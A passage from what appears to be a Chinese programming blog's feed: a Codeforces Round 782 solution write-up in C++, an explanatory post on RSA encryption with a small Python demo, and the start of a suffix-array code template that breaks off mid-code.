title="题目分析"></a>题目分析</h3><p>给定二进制字符串和k次的操作，要求输出最大字典序的字符串。一次操作会使任意一个位置的字符不变，其它的全部取反。那么容易得到一个结论：对任意一个位置操作偶数次不会该边整体字符串。</p><p>如果k为偶数，则未操作过的数（或者说操作次数为偶数）的数将不变，操作过的数（或者说操作次数为奇数）的数将取反。</p><p>如果k为奇数，则与偶数情况刚好相反。</p><p>我们考虑偶数情况，字符串高位开始，若碰到0则取反变成1，减少一次操作次数并记录在这个位置。若操作到所有序列为全1，则将剩余的操作全部甩给最后一位，使得最后的结果只存在 $111…1$ 和 $111…0$。如果为奇数的话，把0当成1，1当成0即可，我们最后输出的时候把0输出为1，1输出为0，操作按偶数方法操作并且尽量使得字符串结果为0。</p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">1000005</span>];</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">1000005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,k;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;k;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="keyword">int</span> p=k%<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(p)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">&#x27;1&#x27;</span>&amp;&amp;k)&#123;</span><br><span class="line">                s[i]=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                a[i]=<span class="number">1</span>;</span><br><span class="line">                k--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                a[i]=<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">&#x27;0&#x27;</span>&amp;&amp;k)&#123;</span><br><span class="line">                s[i]=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">                a[i]=<span class="number">1</span>;</span><br><span class="line">                k--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                a[i]=<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    a[n<span class="number">-1</span>]+=k;</span><br><span class="line">    <span class="keyword">if</span>(k%<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(p)&#123;</span><br><span class="line">            s[n<span class="number">-1</span>]=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            s[n<span class="number">-1</span>]=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(p^(s[i]==<span class="string">&#x27;1&#x27;</span>))<span class="built_in">putchar</span>(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">putchar</span>(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    &#125;<span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Line-Empire"><a href="#C-Line-Empire" class="headerlink" title="C. Line Empire"></a>C. Line Empire</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/18/Codeforces%20Round%20782(Div.2)/3.png" alt="3"></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>给定占领的国家的位置和占领花费系数以及迁都花费系数，求最少花费占领所有王国。</p><p>我们可以算迁都产生的花费和产生的收益进行比较，当收益&gt;=花费时我们选择迁都，否则选择直接攻打那些国家。</p><p>不难得到迁都产生的花费为 $b|x_i-pos|$，pos为当前首都的位置，得到的收益为：$a|x_i-pos|*(n-i)$，判断一下模拟就直接过。</p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> x[<span class="number">1000005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,a,b;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lld %lld %lld&quot;</span>,&amp;n,&amp;b,&amp;a);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    x[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> pos=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="comment">//attack</span></span><br><span class="line">        ans+=a*(x[i]-pos);</span><br><span class="line"><span class="comment">//        printf(&quot;attack %d %d %d\n&quot;,i,x[i],a);</span></span><br><span class="line"><span class="comment">//        printf(&quot;ans=%d\n&quot;,ans);</span></span><br><span class="line">        <span class="keyword">int</span> cost=(n-i)*a*(x[i]-pos);</span><br><span class="line">        <span class="keyword">if</span>(cost&gt;=b*(x[i]-pos))&#123;</span><br><span class="line">            ans+=b*(x[i]-pos);</span><br><span class="line">            pos=x[i];</span><br><span class="line"><span class="comment">//            printf(&quot;move in pos %d\n&quot;,i);</span></span><br><span class="line"><span class="comment">//            printf(&quot;ans=%d\n&quot;,ans);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D-Reverse-Sort-Sum"><a href="#D-Reverse-Sort-Sum" class="headerlink" title="D. Reverse Sort Sum"></a>D. Reverse Sort Sum</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/18/Codeforces%20Round%20782(Div.2)/4.png" alt="4"></p><h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>给你描述了一个序列 A 的值为 $\sum _{i=1}^{n}f(i,A)$，$f(i,A)$ 函数得到的序列就是将序列 A 的前 i 个数排序，数的取值只有0,1。现在给定最终的结果，让你逆向分析初始可能的0,1序列。</p><p>这个我写了个假算法，我自己也无法证明这个算法的正确性，但是他就是过了。。</p><p>首先分析序列后半部分，容易得到，若$a_i&lt;i$，那么 $x_i=0$，否则$x_i=1$，因为后半部分至少有一半的值是来自自己贡献的。拿最后一个举例，如果最后一个值为1或0，那么原序列最后一个值必是0。否则是最后一个值一定是 n，没有其它情况，可以很容易得到的。</p><p>对于前半部分的序列的值确定了第$i$个0的位置，当然后半部分我们都确定好了，如果超出则直接结束循环输出结果。</p><h3 id="标程-3"><a href="#标程-3" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> x[<span class="number">1000005</span>];</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">1000005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x[i]);</span><br><span class="line">        a[i]=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n;i&gt;n/<span class="number">2</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(x[i]&lt;i)&#123;</span><br><span class="line">            a[i]=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            a[i]=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n/<span class="number">2</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!x[i])&#123;</span><br><span class="line">            a[i]=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(a[i]==<span class="number">0</span>)x[i]+=i<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span>(x[i]==n)<span class="keyword">break</span>;</span><br><span class="line">        a[x[i]+<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>D题可能有点问题，欢迎大家hack。</p><p>总之第一次Div2能做出四题，还是很开心的。</p><p>提交记录：</p><p><img src="/2022/04/18/Codeforces%20Round%20782(Div.2)/5.png" alt="5"></p><p><img src="/2022/04/18/Codeforces%20Round%20782(Div.2)/6.png" alt="6"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;还是很开心的，第一次CF打出来D题，嘎嘎上132分，目前1584分，紫名指日可待。&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="codeforces" scheme="http://example.com/categories/icpc/codeforces/"/>
    
    <category term="思维" scheme="http://example.com/categories/icpc/codeforces/%E6%80%9D%E7%BB%B4/"/>
    
    
  </entry>
  
  <entry>
    <title>RSA加密原理解析</title>
    <link href="http://example.com/2022/04/15/RSA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/"/>
    <id>http://example.com/2022/04/15/RSA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/</id>
    <published>2022-04-15T00:00:00.000Z</published>
    <updated>2022-04-18T06:51:22.730Z</updated>
    
    <content type="html"><![CDATA[<p>今天来深度解析一下<code>RSA</code>加密</p><span id="more"></span><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>还是最朴素的例子，<code>Alice</code>和<code>Bob</code>要在不安全的路线上发送信息，整条线路完全被窃听者<code>Eve</code>所知，如何让<code>Alice</code>和<code>Bob</code>安全地通信呢？如果这个例子略难懂，那换一个来讲，我要给别人寄个快递，我怎样让别人不知道我寄的是什么，一般情况下，如果没什么特殊情况，快递是不会被随便拆开查看的，但是也很难说，如果我给我实际要送的东西上把锁，那么即使我送的快递被拆开，没有钥匙也不会有人知道我送的是啥，而钥匙只有收件人拥有。</p><p>这就是非对称加密的一个例子了，一个人只有锁，另一个人有钥匙，可以这么说，当把锁关上的那一刻，寄件人都没办法打开去检查他寄的是啥，如果这个锁足够强大的话。</p><h2 id="RSA加密"><a href="#RSA加密" class="headerlink" title="RSA加密"></a>RSA加密</h2><p>rsa主要是利用一系列的数学公式，让推导难以逆向分析，常见的有右移运算或者取模运算，RSA主要是使用取模运算。首先，我选择一个指数(e)，让明文(m)进行这么多次的幂运算，再模上一个数(N)，这也就得到了密文(c)，这个密文难以逆向得到明文，因为取模运算不可逆，这个e和N是公开的，所有人都可以加密，也就是锁，但是钥匙只有自己拥有。</p><p><img src="/2022/04/15/RSA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/1.png" alt="1"></p><p>这里也先给出加密和解密的公式：</p><p><img src="/2022/04/15/RSA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/2.png" alt="2"></p><p>在这里d由一个公式算得：d相当于e在模φ(n)意义下的逆元。也就是它们满足这个公式：</p><p>$e\times d \ \ \text{mod}\ \ φ(n)=1$</p><h2 id="RSA加密原理解析"><a href="#RSA加密原理解析" class="headerlink" title="RSA加密原理解析"></a>RSA加密原理解析</h2><p>为什么满足了这个关系就能通过上面的公式解密了呢？</p><p>通过e和d满足的关系我们可以得到这样的式子：</p><p>$e \times d=1+k*φ(n)$</p><p>k为任意整数。</p><p>$d=\frac{1+k*φ(n)}{e}$</p><p>这里还需要一个定理：欧拉定理</p><h3 id="欧拉定理"><a href="#欧拉定理" class="headerlink" title="欧拉定理"></a>欧拉定理</h3><p>这个算费马小定理的扩展吧，费马小定理的表达式如下：</p><p>对于任意整数a和任意质数p有以下式子成立：</p><p>$a^p$与$a$在$\ \text{mod}\ p$ 意义下同余，即$a^{p-1}\ \text{mod}\ p=1$</p><p>而对于任意质数，它的欧拉函数就是自己-1，欧拉函数的描述为</p><blockquote><p>欧拉函数 是小于或等于n的正整数中与n互质的数的数目</p></blockquote><p>而对于非质数，它一定可以写成若干个质数相乘，即</p><p>$n=p_1^{a_1}\times p_2^{a_2}\times p_3^{a_3}\times……\times p_n^{a_n}$</p><p>$a_i$为任意整数，$p_i$为任意质数，就是说，任何一个大于2的整数一定会有上式成立。</p><p>它的欧拉函数则是</p><p>$φ(n)=(p_1-1)p_1^{a_1-1}\times(p_2-1)p_2^{a_2-1}\times(p_3-1)p_3^{a_3-1}\times……\times(p_n-1)p_n^{a_n-1}$</p><p>那么欧拉定理的表达式是什么呢，那就是下面这个式子：</p><p>任意正整数a和p，有以下式子成立</p><p>$a^{φ(p)}\ \text{mod}\ p=1$</p><p>有了这个式子之后我们再代入上面那个式子，可以得到</p><p>$m^{e\times d}\ \text{mod}\  n=m^{1+kφ(n)}\ \text{mod}\ n$</p><p>这里需要用到一些简单的同余定理：</p><p>$a\times b\ \text{mod}\ n=((a\ \text{mod}\ n)\times (b\ \text{mod}\ n))\ \text{mod}\ n$</p><p>那么$m^{1+kφ(n)}\ \text{mod}\ n=m*(m^{φ(n)}\ \text{mod}\ n)^k\ \text{mod}\ n$</p><p>而括号里的表达式恒为1，最后结果就变成了$m$</p><p>可以发现，如果m不大于n，那么m的值应当是唯一的，而加密出现的中间产物$c$若没有$d$则永远无法推到得到$m$，这也就是<code>RSA</code>算法的核心了。</p><h2 id="RSA密钥生成"><a href="#RSA密钥生成" class="headerlink" title="RSA密钥生成"></a>RSA密钥生成</h2><p>讲完了原理之后我们来讲讲怎么生成RSA密钥，首先选取两个很大的质数p,q，这里得到n=p*q，那么容易得到n的欧拉函数$φ(n)=(p-1)\times (q-1)$</p><p>再任意选取一个质数e作为加密质数，也很容易算出解密指数$d=\text{inverse}(e,φ(n))$ ，inverse为求模逆元的函数。</p><p>$(e,n)$就是公钥，$(d,n)$就是私钥，这样我们的密钥就生成完毕了。</p><h2 id="python代码实现"><a href="#python代码实现" class="headerlink" title="python代码实现"></a>python代码实现</h2><p>这里用到一个<code>Crypto</code>库，安装方法为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pycryptodome</span><br></pre></td></tr></table></figure><p>demo:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p=getPrime(<span class="number">512</span>)</span><br><span class="line">q=getPrime(<span class="number">512</span>)</span><br><span class="line">n=p*q</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=inverse(e,phi)</span><br><span class="line">m=<span class="number">123456</span></span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">dec=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(dec)</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="/2022/04/15/RSA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/3.png" alt="3"></p><p>你也可以多取几个其它的数试试看，看看能不能得到一样的结果，因为质数随机生成，print(c)这一步不能保证一模一样，但是dec的值一定是和你输入的m一样的。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;今天来深度解析一下&lt;code&gt;RSA&lt;/code&gt;加密&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="crypto" scheme="http://example.com/categories/ctf/crypto/"/>
    
    
  </entry>
  
  <entry>
    <title>SA板子</title>
    <link href="http://example.com/2022/04/02/SA%E6%9D%BF%E5%AD%90/"/>
    <id>http://example.com/2022/04/02/SA%E6%9D%BF%E5%AD%90/</id>
    <published>2022-04-02T14:00:00.000Z</published>
    <updated>2022-04-18T06:51:22.735Z</updated>
    
    <content type="html"><![CDATA[<p>本篇博客只有板子。</p><span id="more"></span><p>sa[i]：排名为i的后缀的下标</p><p>rak[i]：后缀suff[i]的排名</p><p>Height[i]：后缀按照字典排序之后，该后缀与上一个后缀的最长公共前缀，也就是排名为i的后缀字符串和排名为i-1的后缀字符串的最长公共前缀。</p><h2 id="DA算法-O-nlogn"><a href="#DA算法-O-nlogn" class="headerlink" title="DA算法(O(nlogn))"></a>DA算法(O(nlogn))</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">100010</span>;</span><br><span class="line"><span class="keyword">int</span> wa[N],wb[N],wv[N],wss[N],rak[N],height[N],cal[N],n,sa[N];</span><br><span class="line"><span class="keyword">char</span> s[N];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> *r,<span class="keyword">int</span> a,<span class="keyword">int</span> b,<span class="keyword">int</span> l)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="keyword">return</span> r[a]==r[b]&amp;&amp;r[a+l]==r[b+l];&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">da</span><span class="params">(<span class="keyword">int</span> *r,<span class="keyword">int</span> *sa,<span class="keyword">int</span> n,<span class="keyword">int</span> M)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">int</span> i,j,p,*x=wa,*y=wb,*t;</span><br><span class="line">     <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;M;i++) wss[i]=<span class="number">0</span>;</span><br><span class="line">     <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++) wss[x[i]=r[i]]++;</span><br><span class="line">     <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;M;i++) wss[i]+=wss[i<span class="number">-1</span>];</span><br><span class="line">     <span class="keyword">for</span>(i=n<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--) sa[--wss[x[i]]]=i;</span><br><span class="line">     <span class="keyword">for</span>(j=<span class="number">1</span>,p=<span class="number">1</span>;p&lt;n;j*=<span class="number">2</span>,M=p) &#123;</span><br><span class="line">        <span class="keyword">for</span>(p=<span class="number">0</span>,i=n-j;i&lt;n;i++) y[p++]=i;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++) <span class="keyword">if</span>(sa[i]&gt;=j) y[p++]=sa[i]-j;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++) wv[i]=x[y[i]];</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;M;i++) wss[i]=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++) wss[wv[i]]++;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;M;i++) wss[i]+=wss[i<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">for</span>(i=n<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--) sa[--wss[wv[i]]]=y[i];</span><br><span class="line">        <span class="keyword">for</span>(t=x,x=y,y=t,p=<span class="number">1</span>,x[sa[<span class="number">0</span>]]=<span class="number">0</span>,i=<span class="number">1</span>;i&lt;n;i++)</span><br><span class="line">        x[sa[i]]=<span class="built_in">cmp</span>(y,sa[i<span class="number">-1</span>],sa[i],j)?p<span class="number">-1</span>:p++;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span 